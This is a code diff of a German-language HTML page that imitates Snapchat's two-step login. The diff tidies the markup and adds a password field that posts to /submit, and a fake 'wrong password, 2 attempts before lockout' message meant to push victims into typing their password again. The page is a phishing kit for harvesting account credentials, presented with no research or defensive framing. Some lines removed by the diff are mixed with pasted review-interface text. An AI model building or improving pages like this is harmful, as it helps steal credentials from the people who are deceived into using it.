@@ -9,21 +9,29 @@
 </head>
 <body>
   <div class="login-container">
-     <form action="/submit" method="POST">
+    <form action="/submit" method="POST">
       <div class="login-box" id="step1">
-              <img src="snapchat-logo.png" alt="Snapchat" class="logo" />
+        <img src="snapchat-logo.png" alt="Snapchat" class="logo" />
         <h2>Logge dich bei<br />Snapchat ein</h2>
         <label for="username">Nutzername oder E-Mail</label>
         <input type="text" id="username" name="username" required />
         <button type="button" id="step1-button" onclick="goToStep2()" disabled>Weiter</button>
       </div>
-         <div class="login-box" id="step2" style="display: none;">
+
+      <div class="login-box" id="step2" style="display: none;">
         <img src="snapchat-logo.png" alt="Snapchat" class="logo" />
         <h2>Passwort eingeben</h2>
-             <div class="email-mask">
-          dia***comAdd
+        <div class="email-mask">
+          dia***com
           <a href="#" onclick="goToStep1()">Das bist nicht du?</a>
-                </div>Add commentMore actions
+        </div>
+        <label for="password">Passwort</label>
+        <input type="password" id="password" name="password" required />
+        <div id="password-error" class="error-message" style="display: none; color: red; font-size: 14px; margin-top: 10px;">
+          Falsches Passwort. Noch 2 Versuche bis zur Kontosperrung.
+        </div>
+        <button type="button" id="step2-button" disabled>Weiter</button>
+      </div>
     </form>
   </div>
 
@@ -133,7 +141,7 @@
 
   <script src="script.js"></script>
   <script>
-  document.addEventListener("DOMContentLoaded", function () {Add commentMore actions
+  document.addEventListener("DOMContentLoaded", function () {
     function handleLanguageChange(selectedLang) {
       switch (selectedLang) {
         case "de":
